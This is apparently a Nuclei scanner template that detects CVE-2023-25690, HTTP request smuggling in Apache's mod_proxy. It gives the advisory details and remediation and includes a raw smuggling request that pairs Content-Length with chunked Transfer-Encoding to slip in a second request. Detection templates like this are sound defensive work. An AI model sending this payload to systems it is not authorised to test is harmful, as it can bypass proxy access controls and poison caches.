id: CVE-2023-25690

info:
  name: Apache HTTP Server - HTTP Request Smuggling
  author: melmathari
  severity: critical
  description: |
    Some mod_proxy configurations on Apache HTTP Server versions 2.4.0 through 2.4.55 allow a HTTP Request Smuggling attack. Configurations are affected when mod_proxy is enabled along with some form of RewriteRule or ProxyPassMatch in which a non-specific pattern matches some portion of the user-supplied request-target (URL) data and is then re-inserted into the proxied request-target using variable substitution.
  impact: |
    Request splitting/smuggling could result in bypass of access controls in the proxy server, proxying unintended URLs to existing origin servers, and cache poisoning.
  remediation: |
    Users are recommended to update to at least version 2.4.56 of Apache HTTP Server.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-25690
    - https://httpd.apache.org/security/vulnerabilities_24.html
    - http://packetstormsecurity.com/files/176334/Apache-2.4.55-mod_proxy-HTTP-Request-Smuggling.html
    - https://lists.debian.org/debian-lts-announce/2023/04/msg00028.html
    - https://security.gentoo.org/glsa/202309-01
    - https://github.com/dhmosfunk/CVE-2023-25690-POC
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-25690
    cwe-id: CWE-444
    cpe: cpe:2.3:a:apache:http_server:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: apache
    product: http_server
    shodan-query: apache
  tags: cve,cve2023,apache,smuggling,http,mod-proxy,intrusive

http:
  - raw:
      - |
        POST /proxy/ HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 6
        Transfer-Encoding: chunked
        Connection: keep-alive

        0

        GET /smuggled HTTP/1.1
        Host: {{Hostname}}

    unsafe: true
    read-all: true
    max-redirects: 2
    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "POST /proxy/"
          - "GET /smuggled"
        condition: or

      - type: status
        status:
          - 200
          - 400
          - 408
          - 502
